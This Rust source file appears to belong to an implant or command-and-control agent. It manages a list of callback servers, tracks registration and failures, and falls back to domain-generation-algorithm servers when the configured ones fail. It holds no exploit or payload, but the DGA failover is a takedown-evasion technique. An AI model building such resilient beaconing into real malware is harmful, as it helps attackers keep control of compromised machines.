use std::time::{Duration, Instant};
use indexmap::IndexMap;
use malefic_helper::debug;
use crate::config::ServerConfig;

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone, PartialEq)]
pub enum ServerStatus {
    NotRegistered,
    Registered,
    Unavailable,
}

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct ServerInfo {
    pub address: String,
    pub server_config: ServerConfig,
    pub status: ServerStatus,
    pub last_success: Option<Instant>,
    pub last_failure: Option<Instant>,
    pub consecutive_failures: u32,
    pub can_retry: bool,
}

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct ServerManagerConfig {
    pub max_retry_per_server: u32,      // 单个服务器最大重试次数
    pub max_global_retry: u32,          // 已注册情况下的全局重试次数
    pub max_initial_retry: u32,         // 初次注册的最大尝试次数
    pub connection_timeout: Duration,    // 连接超时时间
    pub enable_dga: bool,               // 是否启用DGA
}

impl Default for ServerManagerConfig {
    fn default() -> Self {
        use crate::config::{SERVER_RETRY, GLOBAL_RETRY, INIT_RETRY, DGA_ENABLE};

        Self {
            max_retry_per_server: *SERVER_RETRY,
            max_global_retry: *GLOBAL_RETRY,
            max_initial_retry: *INIT_RETRY,
            enable_dga: *DGA_ENABLE,
            connection_timeout: Duration::from_secs(10),
        }
    }
}

#[cfg_attr(debug_assertions, derive(Debug))]
pub struct ServerManager {
    servers: IndexMap<String, ServerInfo>,
    pub current_index: usize,
    pub config: ServerManagerConfig,
    pub has_registered: bool,
    dga_generator: Option<crate::dga::DgaGenerator>,
    pub dga_mode: bool,
}

impl ServerManager {

    pub fn new(server_configs: Vec<ServerConfig>, config: Option<ServerManagerConfig>) -> Self {
        let config = config.unwrap_or_default();
        
        let dga_generator = if config.enable_dga {
            let dga_configs: Vec<ServerConfig> = server_configs.iter()
                .filter(|config| config.supports_dga())
                .cloned()
                .collect();

            if !dga_configs.is_empty() {
                match crate::dga::DgaGenerator::from_server_configs(dga_configs) {
                    Ok(gen) => Some(gen),
                    Err(_e) => {
                        debug!("[server_manager] Failed to create DGA generator: {:?}", _e);
                        None
                    }
                }
            } else {
                debug!("[server_manager] No servers support DGA");
                None
            }
        } else {
            None
        };

        let mut servers = IndexMap::new();
        for server_config in server_configs {
            let address = server_config.address.clone();
            servers.insert(address.clone(), ServerInfo {
                address: address.clone(),
                server_config,
                status: ServerStatus::NotRegistered,
                last_success: None,
                last_failure: None,
                consecutive_failures: 0,
                can_retry: true,
            });
        }
       
        let dga_enable = dga_generator.is_some();
        Self {
            servers,
            current_index: 0,
            config,
            has_registered: false,
            dga_generator,
            dga_mode: dga_enable
        }
    }

    pub fn current_server(&self) -> Option<&ServerInfo> {
        self.servers.get_index(self.current_index).map(|(_, s)| s)
    }

    pub fn current_server_config(&mut self) -> Option<ServerConfig> {
        self.servers.get_index(self.current_index).map(|(_, s)| s.server_config.clone())
    }

    pub fn current_address(&self) -> Option<&str> {
        self.current_server().map(|s| s.address.as_str())
    }

    pub fn mark_register(&mut self) {
        if let Some(server) = self.servers.get_index_mut(self.current_index).map(|(_, s)| s) {
            server.status = ServerStatus::Registered;
            server.last_success = Some(Instant::now());
            server.consecutive_failures = 0;
            self.has_registered = true;
            debug!("[server_manager] Server {} registration successful", server.address);
        }
    }

    pub fn mark_success(&mut self) {
        if let Some(server) = self.servers.get_index_mut(self.current_index).map(|(_, s)| s) {
            server.last_success = Some(Instant::now());
            server.consecutive_failures = 0;
            debug!("[server_manager] Server {} communication successful", server.address);
        }
    }

    pub fn mark_failure(&mut self) {
        if let Some(server) = self.servers.get_index_mut(self.current_index).map(|(_, s)| s) {
            server.last_failure = Some(Instant::now());
            server.consecutive_failures += 1;

            if server.consecutive_failures >= self.config.max_retry_per_server {
                server.status = ServerStatus::Unavailable;
                debug!("[server_manager] Server {} marked as unavailable after {} failures",
                       server.address, server.consecutive_failures);
            } else {
                debug!("[server_manager] Server {} failure count: {}/{}",
                       server.address, server.consecutive_failures, self.config.max_retry_per_server);
            }
        }
    }

    pub fn retry_current(&self) -> bool {
        if let Some(server) = self.current_server() {
            server.consecutive_failures < self.config.max_retry_per_server
        } else {
            false
        }
    }

    pub fn is_registered(&self) -> bool {
        if let Some(server) = self.current_server() {
            server.status == ServerStatus::Registered
        } else {
            false
        }
    }

    pub fn switch_to_next(&mut self) -> bool {
        let _start_index = self.current_index;
        let total_servers = self.servers.len();

        for i in self.current_index..total_servers {
            let next_index = (self.current_index + i) % total_servers;

            if let Some((_, server)) = self.servers.get_index(next_index) {
                if server.status != ServerStatus::Unavailable {
                    self.current_index = next_index;
                    debug!("[server_manager] Switched to server {} (index: {})",
                           server.address, next_index);
                    return true;
                }
            }
        }
        if self.config.enable_dga {
            let new_servers = if let Some(ref dga_generator) = self.dga_generator {
                dga_generator.generate_new_server()
            } else {
                vec![]
            };
            for server_config in new_servers {
                let address = server_config.address.clone();
                self.servers.insert(address.clone(), ServerInfo {
                    address: address.clone(),
                    server_config,
                    status: ServerStatus::NotRegistered,
                    last_success: None,
                    last_failure: None,
                    consecutive_failures: 0,
                    can_retry: true,
                });
            }

            self.current_index += 1;
            debug!("[server_manager] Switched to next DGA server (index: {})", self.current_index);
        } else{
            self.current_index = 0;
        }
        true
    }

    pub fn reset_current_failures(&mut self) {
        if let Some(server) = self.servers.get_index_mut(self.current_index).map(|(_, s)| s) {
            server.consecutive_failures = 0;
            debug!("[server_manager] Reset failure count for server {}", server.address);
        }
    }

    pub fn total_servers(&self) -> usize {
        self.servers.len()
    }
    
    pub fn all_servers_unavailable(&self) -> bool {
        self.servers.iter().all(|(_, s)| s.status == ServerStatus::Unavailable)
    }

    pub fn get_stats(&self) -> ServerStats {
        let registered = self.servers.iter().filter(|(_, s)| s.status == ServerStatus::Registered).count();
        let not_registered = self.servers.iter().filter(|(_, s)| s.status == ServerStatus::NotRegistered).count();
        let unavailable = self.servers.iter().filter(|(_, s)| s.status == ServerStatus::Unavailable).count();

        ServerStats {
            total: self.servers.len(),
            registered,
            not_registered,
            unavailable,
            current_index: self.current_index,
            has_registered: self.has_registered,
        }
    }

    pub fn get_server_config(&self, address: &str) -> Option<&ServerConfig> {
        self.servers.get(address).map(|s| &s.server_config)
    }
    
}

#[cfg_attr(debug_assertions, derive(Debug))]
pub struct ServerStats {
    pub total: usize,
    pub registered: usize,
    pub not_registered: usize,
    pub unavailable: usize,
    pub current_index: usize,
    pub has_registered: bool,
}
